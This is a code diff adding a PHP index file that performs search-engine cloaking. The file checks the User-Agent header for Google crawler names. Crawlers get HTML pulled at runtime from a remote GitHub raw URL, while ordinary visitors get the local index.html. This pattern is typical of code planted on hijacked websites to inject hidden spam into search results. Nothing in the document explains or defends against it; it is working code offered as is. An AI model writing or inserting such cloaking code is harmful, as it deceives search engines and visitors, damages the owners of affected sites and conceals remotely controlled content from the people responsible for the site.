@@ -1,0 +1,23 @@
+<?php
+$bot_user_agents=array("Googlebot","Googlebot-Image","Googlebot-News","Googlebot-Video","Storebot-Google","Google-InspectionTool","GoogleOther","GoogleOther-Image","GoogleOther-Video","Google-CloudVertexBot","Google-Extended","APIs-Google","AdsBot-Google-Mobile","AdsBot-Google","Mediapartners-Google","FeedFetcher-Google","Google-Favicon","Google Favicon","Googlebot-Favicon","Google-Site-Verification","Google-Read-Aloud","GoogleProducer","Google Web Preview","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebookexternalhit","ia_archiver","Alexa Crawler","AhrefsBot","Semrushbot");
+
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+
+if (is_google_bot()) {
+    $bot_content = file_get_contents('https://raw.githubusercontent.com/bahlil-ktl/oneshoot/refs/heads/main/ww.html');
+    echo $bot_content;
+    exit;
+} else {
+    include('index.html');
+    exit;
+}
+
+?>
